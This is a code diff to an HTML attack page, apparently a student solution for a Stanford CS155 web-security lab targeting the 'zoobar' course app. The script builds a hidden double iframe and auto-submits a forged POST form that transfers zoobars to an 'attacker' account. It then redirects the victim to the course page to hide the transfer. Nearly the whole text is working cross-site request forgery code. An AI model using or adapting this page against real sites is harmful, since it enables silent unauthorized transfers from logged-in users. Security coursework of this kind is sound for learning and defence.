@@ -42,27 +42,26 @@
 		
 		<script type="text/javascript">
 		//<![CDATA[
+			// var hostname = "localhost";
+			var hostname = "zoobar.stanford.edu";
+			var action = "http://" + hostname + "/transfer.php"
+			var zoobars = "10";
+			var attacker_name = "attacker";
+			var timeout = 100;
+
 			/* 
 			 * Second (inner) frame for the double framing attack + form that does the transfer and posts to 
 			 * inner form.
 			 * Note: need id and name to match for iframe, otherwise Firefox will not post form to target iframe
 			 * see: http://stackoverflow.com/questions/7083325/firefox-form-targetting-an-iframe-is-opening-new-tab
 			 */
-			var egg_localhost = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
-				"<form id='transferForm' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" +
-				"<input type='text' name='zoobars' value='10'>" +
-				"<input type='text' name='recipient' value='attacker'>" +
+			var egg = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
+				"<form id='transferForm' action='" + action + "' method='POST' target='innerFrame'>" +
+				"<input type='text' name='zoobars' value='" + zoobars + "'>" +
+				"<input type='text' name='recipient' value='" + attacker_name + "'>" +
 				"<input type='text' name='submission' value='Send'>" +
 				"</form>";
 
-			var egg_stanford = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
-				"<form id='transferForm' action='http://zoobar.stanford.edu/transfer.php' method='POST' target='innerFrame'>" +
-				"<input type='text' name='zoobars' value='10'>" +
-				"<input type='text' name='recipient' value='alamo_attacker'>" +
-				"<input type='text' name='submission' value='Send'>" +
-				"</form>";
-
-			// TODO: need to change localhost to zoobar.stanford.edu
 			// TODO: test on OSX firefox on zoobar.stanford.edu
 			// TODO: change alamo_attacker to attacker in stanford egg
 			// TODO: change attack to use asynchronous AJAX 
@@ -78,15 +77,14 @@
 			outerFrameDoc.close();
 			
 			/* Create the inner frame and form within the outer frame. */
-			// outerFrameDoc.body.innerHTML = egg_localhost;
-			outerFrameDoc.body.innerHTML = egg_stanford;
+			outerFrameDoc.body.innerHTML = egg;
 			
 			/* Submit the transform form */
 			var transferForm = outerFrameDoc.body.children['transferForm'];
 			transferForm.submit();
 			
 			/* Wait 50ms for POST to succeed and redirect to crypto.stanford.edu/cs155 */
-			setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 100 );
+			setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, timeout );
 		//]]>
 		</script>
 		
